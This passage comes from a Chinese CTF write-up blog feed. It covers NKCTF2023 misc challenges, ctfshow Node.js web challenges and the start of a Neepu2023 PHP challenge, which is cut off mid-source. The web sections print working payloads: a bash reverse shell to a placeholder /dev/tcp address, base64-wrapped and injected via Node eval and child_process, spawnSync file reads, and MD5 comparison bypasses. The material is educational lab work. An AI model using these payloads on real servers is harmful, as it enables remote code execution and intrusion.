class="hljs-number">2</span>B%<span class="hljs-number">2</span>B<span class="hljs-variable">$_</span>;<span class="hljs-variable">$$_</span>[_](<span class="hljs-variable">$$_</span>[%FA]);&amp;_=highlight_file&amp;%FA=/flag<br></code></pre></td></tr></table></figure><p>很多函数被过滤了，我们使用<code>highlight_file</code>直接读flag</p><p><img src="https://s2.loli.net/2023/03/27/gBH7mVjMDGZwcrF.png" alt="image-20230327150853413"></p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard-misc"></a>hard-misc</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">JYYHOYLZIJQW<span class="hljs-name">G27</span>FQWWOJPEX<span class="hljs-number">4</span>WH<span class="hljs-number">3</span>PZ<span class="hljs-name">M3</span>T<span class="hljs-number">3</span>S<span class="hljs-number">2</span>JDPPXS<span class="hljs-symbol">NAUTSLINKEMMRQGIZ6</span><span class="hljs-symbol">NCER42</span><span class="hljs-meta">O2</span>LZF<span class="hljs-number">2</span>Q<span class="hljs-number">3</span>X<span class="hljs-number">3</span>ZAI=<br></code></pre></td></tr></table></figure><p>base32解密</p><h4 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h4><img src="https://s2.loli.net/2023/03/27/WV46CoPBYZManhS.png" alt="image-20230327151507045" style="zoom:50%;" /><p>下载后得到windows镜像，</p><p><img src="https://s2.loli.net/2023/03/27/4vMzOe5SWmxtnsg.png" alt="image-20230327151607984"></p><p>我们直接使用7z打开：</p><img src="https://s2.loli.net/2023/03/27/jnSKicCMmO5IHhq.png" alt="image-20230327152144402" style="zoom:50%;" /><p>找到flag</p><h4 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h4><p>下载得到一张bmp图片</p><img src="https://s2.loli.net/2023/03/27/DcviSEVNuBIfdC5.png" alt="image-20230327155216450" style="zoom:33%;" /><p>文件尾存在部分flag：</p><p><img src="https://s2.loli.net/2023/03/27/a2TnZNUGEVvpKWd.png" alt="image-20230327155934723"></p><p>注意要将编码方式改为ASCII码：</p><img src="https://s2.loli.net/2023/03/27/KWiquGX5aobmFdV.png" alt="image-20230327160010888" style="zoom: 67%;" /><p>然后我们使用<code>zsteg -a</code>，分析bmp图片隐写：</p><p><img src="https://s2.loli.net/2023/03/27/D1aXOMBRZlEnGQz.png" alt="image-20230327161403334"></p><p>这里可能存在flag，我们把它分离出来：<code>zsteg -E</code></p><p><img src="https://s2.loli.net/2023/03/27/uIkVPoc78sRpFJQ.png" alt="image-20230327161517721"></p><p>获得了一个txt文件</p><img src="https://s2.loli.net/2023/03/27/1z5ZjQxnWIbrgcG.png" alt="image-20230327161540672" style="zoom: 67%;" /><p>我们查找一下另一半flag：</p><p><img src="https://s2.loli.net/2023/03/27/XEa5YCyKM3Nntp4.png" alt="image-20230327161625562"></p><p>找到了，然后我们只需要倒过来就得到flag</p><h4 id="easy-rgb"><a href="#easy-rgb" class="headerlink" title="easy_rgb"></a>easy_rgb</h4><p>下载后得到一个加密得rar包</p><p><img src="https://s2.loli.net/2023/03/27/enq5gascG87m2Tt.png" alt="image-20230327161726589"></p><p>和一个存在很多图片得压缩包key</p><p><img src="https://s2.loli.net/2023/03/27/uKDCidNwhS2yO7o.png" alt="image-20230327161816521"></p><p>我们使用 <code>montage</code>将图片拼接起来：（这里有180张图片，我们使用18x10的行列）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">montage</span> *png -tile <span class="hljs-number">18</span>x10 -geometry +<span class="hljs-number">0</span>+<span class="hljs-number">0</span> flag.png<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/27/ec1stVFdPrnGNE5.png" alt="image-20230327162344798">然后再用<code>gaps</code>命令，进行排序：</p><img src="https://s2.loli.net/2023/03/27/MsYEPXqelNmoh4F.png" alt="image-20230327162506982" style="zoom: 67%;" /><p>因为每张图片是125像素，所以我们这么写：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gaps <span class="hljs-attr">--image</span> flag<span class="hljs-selector-class">.png</span> <span class="hljs-attr">--size</span>=<span class="hljs-number">125</span><br></code></pre></td></tr></table></figure><p>拼图成功：</p><p><img src="https://s2.loli.net/2023/03/27/M5on68FzIVrw1iJ.png" alt="image-20230327162621107"></p><p>得到key：<code>NKCTF2023</code></p><p>使用key将压缩包进行解压：</p><img src="https://s2.loli.net/2023/03/27/DHzBOyXqTdKYNZP.png" alt="image-20230327162921052" style="zoom: 67%;" /><p>txt文件里面都是数字，我们猜测需要将里面的数字拼起来，形成某种文件。</p><p>我们按照rgb的顺序进行拼接，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br>r = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/r.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>g = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/g.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>b = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/b.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>rs = r.read()<br>gs = g.read()<br>bs = b.read()<br>count = <span class="hljs-number">0</span><br>s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">150</span>):<br>    s = s + rs[count:count+<span class="hljs-number">1</span>]<br>    s = s + gs[count:count+<span class="hljs-number">1</span>]<br>    s = s + bs[count:count+<span class="hljs-number">1</span>]<br>    count = count + <span class="hljs-number">1</span><br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/flag.zip&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>f.write(binascii.unhexlify(s))<br></code></pre></td></tr></table></figure><p>打开zip文件：</p><p><img src="https://s2.loli.net/2023/03/27/PLNWZ12MYFzpjUQ.png" alt="image-20230327163906465"></p><p>提示为：<code>AES-128加密</code></p><p>我们找个网站解密：<a href="https://tool.lmeee.com/jiami/aes">AES-128解密</a></p><p><img src="https://s2.loli.net/2023/03/27/C3ZMumvxo8HN5s6.png" alt="image-20230327164548603"></p><h4 id="easy-word"><a href="#easy-word" class="headerlink" title="easy_word"></a>easy_word</h4>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NKCTF2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs</title>
    <link href="/2023/08/24/nodejs/"/>
    <url>/2023/08/24/nodejs/</url>
    
    <content type="html"><![CDATA[<h3 id="【ctfshow】nodejs"><a href="#【ctfshow】nodejs" class="headerlink" title="【ctfshow】nodejs"></a>【ctfshow】nodejs</h3><h4 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h4><p>login.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> users = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../modules/user&#x27;</span>).<span class="hljs-property">items</span>;<br> <br><span class="hljs-keyword">var</span> findUser = <span class="hljs-keyword">function</span>(<span class="hljs-params">name, password</span>)&#123;<br>  <span class="hljs-keyword">return</span> users.<span class="hljs-title function_">find</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">item</span>)&#123;<br>    <span class="hljs-keyword">return</span> name!==<span class="hljs-string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="hljs-property">username</span> === name.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; item.<span class="hljs-property">password</span> === password;<br>  &#125;);<br>&#125;;<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">var</span> user = <span class="hljs-title function_">findUser</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>, req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>);<br> <br>  <span class="hljs-keyword">if</span>(user)&#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">regenerate</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) &#123;<br>      <span class="hljs-keyword">if</span>(err)&#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>&#125;);        <br>      &#125;<br>       <br>      req.<span class="hljs-property">session</span>.<span class="hljs-property">loginUser</span> = user.<span class="hljs-property">username</span>;<br>      res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录成功&#x27;</span>,<span class="hljs-attr">ret_flag</span>:flag&#125;);              <br>    &#125;);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;账号或密码错误&#x27;</span>&#125;);<br>  &#125;  <br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>user.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">items</span>: [<br>    &#123;<span class="hljs-attr">username</span>: <span class="hljs-string">&#x27;CTFSHOW&#x27;</span>, <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;123456&#x27;</span>&#125;<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure><p>很显然，我们只需要绕过这里： <code>toUpperCase()是javascript中将小写转换成大写的函数。</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> users.<span class="hljs-title function_">find</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">item</span>)&#123;<br>    <span class="hljs-keyword">return</span> name!==<span class="hljs-string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="hljs-property">username</span> === name.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; item.<span class="hljs-property">password</span> === password;<br>  &#125;);<br></code></pre></td></tr></table></figure><p>我们可以使用小写绕过：<code>ctfshow</code></p><p>这里还有一个小trick，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">在<span class="hljs-title class_">Character</span>.<span class="hljs-title function_">toUpperCase</span>()函数中，字符ı会转变为I，字符ſ会变为S。<br>在<span class="hljs-title class_">Character</span>.<span class="hljs-title function_">toLowerCase</span>()函数中，字符İ会转变为i，字符K会转变为k。<br></code></pre></td></tr></table></figure><p>所以我们也可以写成这样：<code>ctfſhow</code></p><h4 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h4><p>源码提示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- /?eval= --&gt;</span><br></code></pre></td></tr></table></figure><p>因此我们可以使用<code>nodejs</code>中的<code>eval()</code>进行命令执行</p><blockquote><p>Node.js中的<code>child_process.exec</code>调用的是&#x2F;bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p></blockquote><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111731049.png" alt="image-20230411173113969"></p><p>这里我们选择反弹shell，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>这一句的意思就是反弹shell，将输出与输入都重定型到指定ip的指定端口上面，</p><p>但是我们不能直接这样，我们需要先base64编码之后(注意加号要进行url编码为%2B)，然后使用echo输出，使用管道符|将输出作为<code>base64 -d</code>输入进行base64解密，最后再传给bash</p><p>这里我选择自己的服务器，首先监听9996端口，然后再execute</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111738001.png" alt="image-20230411173813970"></p><p>成功监听到了：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111740011.png" alt="image-20230411174043978"></p><p>直接读flag</p><h4 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h4><p>我们了解到如下知识点：</p><blockquote><p><code>__filename</code>：当前模块的文件名。 这是当前模块文件的已解析符号链接的绝对路径。</p><p><code>__dirname</code>：可以获得当前文件所在目录从盘符开始的全路径</p></blockquote><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111810969.png" alt="image-20230411181055933"></p><p>有一种方法是使用<code>fs</code>模块去读取当前目录的文件名，然后通过方法去读取文件内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">readdirSync</span>(<span class="hljs-string">&#x27;.&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111828536.png" alt="image-20230411182806500"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;fl001g.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111829758.png" alt="image-20230411182941723"></p><p>常规方法：这里过滤了<code>exec</code>，我们可以使用<code>spawn</code></p><p><code>nodejs</code>的<code>child_process</code>中可以使用 <code>exec</code>、<code>execSync</code>、<code>spawn</code>、<code>spawnSync</code>进行命令执行</p><p>当我们使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">spawnSync</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111835105.png" alt="image-20230411183551070"></p><p>发现，显示出 <code>object</code>，查询资料</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111837564.png" alt="image-20230411183721508"></p><p>返回的object里有个<code>stdout</code>属性，我们调用它，就可以当成字符串输出了：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111838673.png" alt="image-20230411183854636"></p><p>然后我们去读文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// require(&#x27;child_process&#x27;).spawnSync(&#x27;cat fl001g.txt&#x27;).stdout</span><br></code></pre></td></tr></table></figure><p>如果这样读的话语法是错的，我们需要这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">spawnSync</span>(<span class="hljs-string">&#x27;cat&#x27;</span>,[<span class="hljs-string">&#x27;fl001g.txt&#x27;</span>]).<span class="hljs-property">stdout</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111840361.png" alt="image-20230411184039325"></p><p>还有一种思路，通过定义变量，然后多个变量拼接：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111917247.png" alt="在这里插入图片描述"></p><h4 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>) &#123;<br>  <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br>    .<span class="hljs-title function_">update</span>(s)<br>    .<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;xxxxxxx&#x27;</span>;<br>  <span class="hljs-keyword">var</span> a = req.<span class="hljs-property">query</span>.<span class="hljs-property">a</span>;<br>  <span class="hljs-keyword">var</span> b = req.<span class="hljs-property">query</span>.<span class="hljs-property">b</span>;<br>  <span class="hljs-keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="hljs-property">length</span>===b.<span class="hljs-property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="hljs-title function_">md5</span>(a+flag)===<span class="hljs-title function_">md5</span>(b+flag))&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;tql&#x27;</span>&#125;);<br>  &#125;<br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>关键点在这里：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="hljs-property">length</span>===b.<span class="hljs-property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="hljs-title function_">md5</span>(a+flag)===<span class="hljs-title function_">md5</span>(b+flag))&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br></code></pre></td></tr></table></figure><p>这里可以使用数组绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">a = [<span class="hljs-string">&#x27;1&#x27;</span>]<br>b = <span class="hljs-number">1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a + <span class="hljs-string">&#x27;flag&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b + <span class="hljs-string">&#x27;flag&#x27;</span>)<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">1</span><span class="hljs-built_in">flag</span><br><span class="hljs-number">1</span><span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>可以看到，<code>nodejs</code>中：如果<strong>数组与字符串拼接</strong>后输出、<strong>数字与字符串拼接</strong>后输出，结果是一样的</p><p>于是我们就有一种思路，可以a传入数组，然后b传入等值的数字：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>[]=<span class="hljs-number">1</span>&amp;b=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111912743.png" alt="image-20230411191205702"></p><p>还有一种方法，</p><p><code>nodejs</code>中数组只能是数字索引，如果为非数字索引的话，相当于对象了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">a = &#123;<span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-number">1</span>&#125;<br>b = &#123;<span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a + <span class="hljs-string">&#x27;flag&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b + <span class="hljs-string">&#x27;flag&#x27;</span>)<br><br>输出：<br>[object <span class="hljs-title class_">Object</span>]flag<br>[object <span class="hljs-title class_">Object</span>]flag<br></code></pre></td></tr></table></figure><p>因此我们直接绕过：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[x]</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[x]</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Neepu2023</title>
    <link href="/2023/08/24/Neepu2023/"/>
    <url>/2023/08/24/Neepu2023/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Neepu2023"><a href="#Neepu2023" class="headerlink" title="Neepu2023"></a>Neepu2023</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p>进去后一片空白，抓包看看：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221118825.png" alt="image-20230522111739079"></p><p>php7.4.21版本，有一个源码泄露漏洞  <a href="https://buaq.net/go-147962.html">PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞</a></p><p>我们构造这样的请求：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221119115.png" alt="image-20230522111916087"></p><p>但是不知道为什么没回显，必须改成这样：后面需要加一个东西</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221119539.png" alt="image-20230522110249348"></p><p>获得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span>  <span class="hljs-title">one</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$ary</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;key === <span class="hljs-literal">true</span>||<span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish)&#123;<br>                <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;now[<span class="hljs-variable">$name</span>],<span class="hljs-variable">$ary</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">neepuctf</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;now=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key=True;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">two</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$value</span>=<span class="hljs-variable language_">$this</span>-&gt;name[<span class="hljs-variable">$value</span>];<br>    &#125;<br><br>&#125;<br><br><span 